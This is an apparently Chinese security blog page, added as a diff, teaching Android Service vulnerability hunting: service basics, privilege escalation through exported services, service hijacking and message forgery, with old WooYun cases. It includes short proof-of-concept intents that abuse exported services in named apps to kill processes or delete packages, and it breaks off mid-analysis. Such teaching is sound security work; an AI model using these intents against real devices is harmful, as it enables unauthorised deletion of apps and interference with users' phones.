@@ -1,0 +1,643 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"security-kitchen.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"./public/search.json"};
+  </script>
+
+  <meta name="description" content="一、前言今天总结Android APP漏洞挖掘四大组件中service漏洞挖掘的知识，希望能通过这系列的文章，对Android APP漏洞挖掘进行一个更加深入的了解，Android APP中Service的漏洞挖掘和我们前文讲的Activity漏洞挖掘差不多，所以部分知识可以参考上篇帖子Android APP漏洞之战（1）——Activity漏洞挖掘详解。在Service漏洞挖掘中，会逐一列出最基">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Android App漏洞之战（10）——Service漏洞挖掘详解">
+<meta property="og:url" content="http://security-kitchen.com/2023/02/13/bug0010/index.html">
+<meta property="og:site_name" content="欢迎来到安全后厨！">
+<meta property="og:description" content="一、前言今天总结Android APP漏洞挖掘四大组件中service漏洞挖掘的知识，希望能通过这系列的文章，对Android APP漏洞挖掘进行一个更加深入的了解，Android APP中Service的漏洞挖掘和我们前文讲的Activity漏洞挖掘差不多，所以部分知识可以参考上篇帖子Android APP漏洞之战（1）——Activity漏洞挖掘详解。在Service漏洞挖掘中，会逐一列出最基">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0010/1.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0010/2.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0010/3.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0010/4.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0010/5.png">
+<meta property="article:published_time" content="2023-02-13T01:02:19.000Z">
+<meta property="article:modified_time" content="2023-12-23T09:13:44.111Z">
+<meta property="article:author" content="安全后厨团队">
+<meta property="article:tag" content="漏洞挖掘">
+<meta property="article:tag" content="工具">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0010/1.png">
+
+<link rel="canonical" href="http://security-kitchen.com/2023/02/13/bug0010/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Android App漏洞之战（10）——Service漏洞挖掘详解 | 欢迎来到安全后厨！</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="欢迎来到安全后厨！" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+	<div class="headband"></div>
+    <a target="_blank" rel="noopener" href="https://github.com/WindXaa?tab=repositories" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">欢迎来到安全后厨！</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-resources">
+
+    <a href="/resources/" rel="section"><i class="fa fa-download fa-fw"></i>资源</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://security-kitchen.com/2023/02/13/bug0010/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="安全后厨团队">
+      <meta itemprop="description" content="选择有时候比努力更重要">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="欢迎来到安全后厨！">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Android App漏洞之战（10）——Service漏洞挖掘详解
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-02-13 09:02:19" itemprop="dateCreated datePublished" datetime="2023-02-13T09:02:19+08:00">2023-02-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-12-23 17:13:44" itemprop="dateModified" datetime="2023-12-23T17:13:44+08:00">2023-12-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Android-APP%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%88%98/" itemprop="url" rel="index"><span itemprop="name">Android APP漏洞之战</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>今天总结Android APP漏洞挖掘四大组件中service漏洞挖掘的知识，希望能通过这系列的文章，对Android APP漏洞挖掘进行一个更加深入的了解，Android APP中Service的漏洞挖掘和我们前文讲的Activity漏洞挖掘差不多，所以部分知识可以参考上篇帖子<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-269211.htm">Android APP漏洞之战（1）——Activity漏洞挖掘详解</a>。在Service漏洞挖掘中，会逐一列出最基本的漏洞特征，后续会逐步补充相关的漏洞。</p>
+<span id="more"></span>
+<h2 id="二、Service漏洞初步介绍"><a href="#二、Service漏洞初步介绍" class="headerlink" title="二、Service漏洞初步介绍"></a>二、Service漏洞初步介绍</h2><h3 id="1-service基本介绍"><a href="#1-service基本介绍" class="headerlink" title="1.service基本介绍"></a>1.service基本介绍</h3><h4 id="（1）service的基本作用"><a href="#（1）service的基本作用" class="headerlink" title="（1）service的基本作用"></a>（1）service的基本作用</h4><p>Service(服务)是一个一种可以在后台执行长时间运行操作而没有用户界面的应用组件。服务可由其他应用组件启动（如Activity），服务一旦被启动将在后台一直运行，即使启动服务的组件（Activity）已销毁也不受影响。 此外，组件可以绑定到服务，以与之进行交互，甚至是执行进程间通信 (IPC)。</p>
+<h4 id="（2）service的引入-lt-线程与服务的区别-gt"><a href="#（2）service的引入-lt-线程与服务的区别-gt" class="headerlink" title="（2）service的引入&lt;线程与服务的区别&gt;"></a>（2）service的引入&lt;线程与服务的区别&gt;</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）Thread是程序执行的最小单元，是分配CPU的基本单位，可以使用Thread来执行一些异步操作</span><br><span class="line">（<span class="number">2</span>）Service是android的一种机制，运行在主线程的main线程上</span><br><span class="line">    </span><br><span class="line"> 问题：Thread的运行是独立与Activity的，当一个Activity被finish后，你没有主动停止Thread的话，Thread就会一直执行但是Activity被finish后，你不在持有该Thread的引用，你没有办法在不同的Activity中对同一Thread进行控制？</span><br><span class="line"> 解决：你的Thread需要不停的间隔一段时间连接服务器做某种同步，该Thread需要在Activity没有start时候也运行，但是你start一个Activity后，你就不能控制Thread。因此你创建一个Service，在Service里面创建、运行并控制Thread，就可以解决（任何Activity都可以控制同一Service）</span><br><span class="line">    </span><br><span class="line"> 总结：Service是一种消息机制，而你可以在任何有 Context 的地方调用 Context.startService、Context.stopService、Context.bindService，Context.unbindService，来控制它，你也可以在 Service 里注册 BroadcastReceiver，在其他地方通过发送broadcast 来控制它，当然这些都是 Thread 做不到的</span><br></pre></td></tr></table></figure>
+
+<h4 id="（3）service的创建"><a href="#（3）service的创建" class="headerlink" title="（3）service的创建"></a>（3）service的创建</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">步骤：</span><br><span class="line">	（<span class="number">1</span>）我们创建一个服务service</span><br><span class="line">	（<span class="number">2</span>）我们重写服务中的三大方法onCreate()、onStartCommand()、onDestroy()</span><br><span class="line"> 详解：</span><br><span class="line">（<span class="number">1</span>）OnCreate()方法会在服务创建的时候调用</span><br><span class="line">（<span class="number">2</span>）onStartCommand()方法会在每次服务启动的时候调用</span><br><span class="line">（<span class="number">3</span>）onDestroy()会在服务销毁的时候调用通常我们希望在服务启动立刻执行某个动作，就会在onStartCommand()里</span><br></pre></td></tr></table></figure>
+
+<h4 id="（4）service的启动"><a href="#（4）service的启动" class="headerlink" title="（4）service的启动"></a>（4）service的启动</h4><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0010/1.png" alt="image-20210908160022420"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">启动方式：</span><br><span class="line">（<span class="number">1</span>）startService：主要用于启动一个服务执行后台任务，不进行通信，而且必须用stopService来结束，不调用会导致Activity结束而Service还运行</span><br><span class="line">（<span class="number">2</span>）bindService：该方法启动的服务还可以进行通信，启动的Service可以由unbindService来结束，也可以在Activity结束之后自动结束</span><br><span class="line">（<span class="number">3</span>）startService 同时也 bindService 启动的服务：停止服务应同时使用stepService与unbindService</span><br></pre></td></tr></table></figure>
+
+<p>一般来说我们使用服务，主要分为前面两种</p>
+<p><strong>StartService：</strong></p>
+<p>我们根据Intent的启动方式，又可以通过显式启动和隐式启动</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">显示启动：</span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>,TestService.class);</span><br><span class="line">startService(intent);</span><br><span class="line">隐式启动：</span><br><span class="line">（<span class="number">1</span>）使用Action启动</span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();<span class="comment">//Intent intent = new Intent(&quot;活动&quot;)</span></span><br><span class="line">intent.setAction(<span class="string">&quot;XXX&quot;</span>);<span class="comment">//service中定义的action</span></span><br><span class="line">intent.setPackage(getPackageName);需要设置的应用包名</span><br><span class="line">startService(intent);</span><br><span class="line">（<span class="number">2</span>）使用包名启动</span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span>·Intent();</span><br><span class="line"><span class="type">ComponentName</span> <span class="variable">componentName</span> <span class="operator">=</span> New <span class="title function_">ComponentName</span><span class="params">(getPackageName()</span>,<span class="string">&quot;com.example.testservices.TestService&quot;</span>);</span><br><span class="line">intent.setComponent(componentName);</span><br><span class="line">startService(intent);</span><br></pre></td></tr></table></figure>
+
+<p><strong>通过bindService启动：</strong></p>
+<p>我们要实现服务或活动之间的通信，我们要使用bind通信机制</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原理解析：</span><br><span class="line">	（<span class="number">1</span>）bindService启动的服务和调用者是典型的client-server模式。调用者是client，service是server端。service只有一个，但是绑定到service上的client可以有一个或多个。</span><br><span class="line">	（<span class="number">2</span>）client可以通过IBinder接口获取Service实例，从而实现在client端直接调用Service，实现灵活交互</span><br><span class="line">	（<span class="number">3</span>）bindService启动服务的生命周期与其绑定的client息息相关，当client销毁时，绑定解除，或者使用unbindService()方法解除绑定</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">实现步骤：</span><br><span class="line">	服务端：</span><br><span class="line">	（<span class="number">1</span>）定义一个类继承Service</span><br><span class="line">	（<span class="number">2</span>）在Service的onBind()方法中返回IBinder类型的实例</span><br><span class="line">	（<span class="number">3</span>）在service中创建binder的内部类，加入类似getService()的方法返回Service，这样绑定的client就可以通过getService()方法获得Service实例了</span><br><span class="line">	客户端：</span><br><span class="line">	（<span class="number">1</span>）在Manifest.xml文件中配置该Service</span><br><span class="line">	（<span class="number">2</span>）创建ServiceConnection类型实例，并重写onServiceConnected()方法和onServiceDisconnected()方法</span><br><span class="line">	（<span class="number">3</span>）当执行到onServiceConnected回调时，可通过IBinder实例得到Service实例对象，这样可实现client与Service的连接</span><br><span class="line">	（<span class="number">4</span>）onServiceDisconnected回调被执行时，表示client与Service断开连接，在此可以写一些断开连接后需要做的处理</span><br><span class="line">	（<span class="number">5</span>）通过Intent 启动服务<span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>,MyService.class);</span><br><span class="line">	（<span class="number">6</span>）使用Context的bindService(Intent,ServiceConnection,<span class="type">int</span>)方法启动该Service</span><br><span class="line">	（<span class="number">7</span>）不再使用时，调用unbindService(ServiceConnection)方法停止该服务</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-Service漏洞的种类和危害"><a href="#2-Service漏洞的种类和危害" class="headerlink" title="2.Service漏洞的种类和危害"></a>2.Service漏洞的种类和危害</h3><p>Service漏洞的种类大致可以分为：</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0010/2.png" alt="image-20210908160946499"></p>
+<p>Service漏洞的危害：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Service是android四大组件之一，可以长时间的运行在后台。一个组件可以绑定到一个service来进行交互，即使这个交互是进程间通讯也没问题。Service不是分离开的进程，除非其他特殊情况，它不会运行在自己的进程，而是作为运行它的进程的一部分。Service不是线程，意味着它将在主线程里劳作。</span><br><span class="line">如果一个导出的Service没有做严格的限制，任何应用都可以去启动并绑定到这个Service上，取决于被暴露的功能， 这可以是一个应用去执行未授权的行为，获取敏感信息或污染修改内部应用的状态造成威胁。</span><br></pre></td></tr></table></figure>
+
+<h2 id="三、Service漏洞原理分析和复现"><a href="#三、Service漏洞原理分析和复现" class="headerlink" title="三、Service漏洞原理分析和复现"></a>三、Service漏洞原理分析和复现</h2><h3 id="1-权限提升漏洞"><a href="#1-权限提升漏洞" class="headerlink" title="1.权限提升漏洞"></a>1.权限提升漏洞</h3><h4 id="（1）原理介绍"><a href="#（1）原理介绍" class="headerlink" title="（1）原理介绍"></a>（1）原理介绍</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当一个service配置了intent-filter默认是被导出的，如果没对调用Service进行权限，限制或者是没有对调用者的身份进行有效验证，那么恶意构造的APP都可以对此Service传入恰当的参数进行调用，导致恶意行为发生比如调用具有system权限的删除卸载服务删除卸载其他应用。</span><br></pre></td></tr></table></figure>
+
+<h4 id="（2）漏洞复现"><a href="#（2）漏洞复现" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>案例1：<a target="_blank" rel="noopener" href="https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-048735"><strong>猎豹清理大师内存清理权限泄露漏洞</strong></a></p>
+<p>漏洞描述：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Android应用程序猎豹清理大师（原金山清理大师）<span class="number">4.0</span><span class="number">.1</span>及以下版本存在权限泄漏漏洞，泄露的权限为android.permission.RESTART_PACKAGES，用来结束进程来达到清理内存的目的。当没有申请此权限的app向猎豹清理大师发送相应的intent时，便可以结束后台运行的部分app进程。</span><br><span class="line">猎豹清理大师暴露了com.cleanmaster.appwidget.WidgetService服务组件（详见下图），当向此服务发送action为com.cleanmaster.appwidget.ACTION_FASTCLEAN的intent时，便可结束后台运行的一些app进程。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0010/3.png" alt="image-20210908160946499"></p>
+<p>攻击代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(<span class="string">&quot;com.cleanmaster.appwidget.ACTION_FASTCLEAN&quot;</span>);</span><br><span class="line">intent.setPackage(<span class="string">&quot;com.cleanmaster.appwidget.WidgetService&quot;</span>);</span><br><span class="line">startService(intent);</span><br></pre></td></tr></table></figure>
+
+<p>我们通过Intent隐私启动，给服务发送action为com.cleanmaster.appwidget.ACTION_FASTCLEAN的intent时，便可结束后台运行的一些app进程</p>
+<p>案例2：<a target="_blank" rel="noopener" href="https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2010-0509"><strong>乐phone手机任意软件包安装删除漏洞</strong></a></p>
+<p>漏洞描述：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">乐phone手机出厂默认包含一个名为jp.aplix.midp.tools的应用包。本应用以system权限运行，并向其他应用提供ApkInstaller服务，用来进行对Apk文件的安装和删除。通过向ApkInstaller服务传递构造好的参数，没有声明任何权限的应用即可达到安装和删除任意Package的行为，对系统安全性产生极大影响。</span><br></pre></td></tr></table></figure>
+
+<p>攻击代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">in.setComponent(<span class="keyword">new</span> <span class="title class_">ComponentName</span>(<span class="string">&quot;jp.aplix.midp.tools&quot;</span>,<span class="string">&quot;jp.aplix.midp.tools.ApkInstaller&quot;</span>));</span><br><span class="line">in.putExtra(<span class="string">&quot;action&quot;</span>, <span class="string">&quot;deleteApk&quot;</span>);</span><br><span class="line">in.putExtra(<span class="string">&quot;pkgName&quot;</span>, <span class="string">&quot;xxxxx&quot;</span>);</span><br><span class="line">startService(in);</span><br></pre></td></tr></table></figure>
+
+<p>我们通过Intent隐式启动，外部服务启动的方式，启动action为deleteApk的服务，来达到删除任意Package的行为</p>
+<h3 id="2-service劫持"><a href="#2-service劫持" class="headerlink" title="2.service劫持"></a>2.service劫持</h3><h4 id="（1）原理介绍-1"><a href="#（1）原理介绍-1" class="headerlink" title="（1）原理介绍"></a>（1）原理介绍</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击原理：隐式启动services,当存在同名services,先安装应用的services优先级高</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0010/4.png" alt="image-20210908160946499"></p>
+<h3 id="3-消息伪造"><a href="#3-消息伪造" class="headerlink" title="3.消息伪造"></a>3.消息伪造</h3><h4 id="（1）原理介绍-2"><a href="#（1）原理介绍-2" class="headerlink" title="（1）原理介绍"></a>（1）原理介绍</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">暴露的Service对外接收Intent，如果构造恶意的消息放在Intent中传输，被调用的Service接收可能产生安全隐患</span><br></pre></td></tr></table></figure>
+
+<h4 id="（2）漏洞复现-1"><a href="#（2）漏洞复现-1" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>案例：<a target="_blank" rel="noopener" href="https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-094635"><strong>优酷Android 4.5客户端升级漏洞</strong></a></p>
+<p>漏洞描述：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">优酷Android <span class="number">4.5</span>客户端组件暴露导致第三方应用可以触发其升级过程，同时可以指定升级下载的URL地址，可导致任意应用安装！</span><br><span class="line">源代码：</span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onHandleIntent</span><span class="params">(Intent intent)</span> &#123;</span><br><span class="line">        Intent v0;</span><br><span class="line">        String v23;</span><br><span class="line">        <span class="type">Serializable</span> <span class="variable">pushMsg</span> <span class="operator">=</span> intent.getSerializableExtra(<span class="string">&quot;PushMsg&quot;</span>);</span><br><span class="line">        ......</span><br><span class="line">        AppVersionManager.getInstance(Youku.context).showAppAgreementDialog();</span><br><span class="line">        <span class="keyword">switch</span>(pushMsg.type) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>: &#123;</span><br><span class="line">                goto label_53;</span><br><span class="line">            &#125;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">        ......</span><br><span class="line">    label_53:</span><br><span class="line">        intent.setFlags(<span class="number">876609536</span>);</span><br><span class="line">        intent.setClass(<span class="built_in">this</span>, UpdateActivity.class);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;updateurl&quot;</span>, pushMsg.updateurl);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;updateversion&quot;</span>, pushMsg.updateversion);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;updatecontent&quot;</span>, pushMsg.updatecontent);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;updateType&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="built_in">this</span>.startActivity(intent);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure>
+
+<p>漏洞分析：</p>
